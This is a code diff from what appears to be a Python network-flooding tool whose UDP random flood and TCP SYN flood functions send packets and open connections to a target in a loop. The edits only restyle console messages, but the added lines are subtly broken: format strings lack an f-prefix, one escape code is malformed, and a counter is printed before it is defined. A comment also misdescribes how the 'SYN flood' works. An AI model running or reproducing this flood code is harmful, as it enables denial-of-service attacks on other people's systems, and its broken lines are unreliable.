@@ -58,10 +58,10 @@ def udp_random_flood(ip, port, duration, packet_size):
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
-        print(f"[!]\033[91m Error during UDP Random flood: {e}")
+        print(f"‼️\033[91m Error during UDP Random flood: {e}")
     finally:
         sock.close()
-        print(f"[+] UDP Random flood complete! Sent {packet_count} packets.")
+        print(f"🚀 UDP Random flood complete! Sent {packet_count} packets.")
 # TCP Flood Methods
 def tcp_syn_flood_single(ip, port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -73,8 +73,7 @@ def tcp_syn_flood_single(ip, port, duration):
     try:
         while time.time() < end_time:
             time.sleep(0.2)
-            print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!\033[0m")
-            print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94mnum-attack\033[0m")
+            print("☑️ Starting TCP SYN flood \033[38;5;220mconnect-ex \033[32{ip}\033[37m:{port} \033[33mpacket-count{packet_count}\033[0m")
             sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
             packet_count += 1
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
@@ -86,6 +85,7 @@ def tcp_syn_flood_single(ip, port, duration):
 
 def tcp_syn_flood_multi(ip, port, duration):
     end_time = time.time() + duration
+    print("☑️\033[3m Starting TCP SYN flood \033[38;5;220mconnect-ex \033[32{ip}\033[37m:{port} \033[33mpacket-count{packet_count}\033[0m")
     packet_count = [0]  # List to share count across threads
 
     def syn_worker():
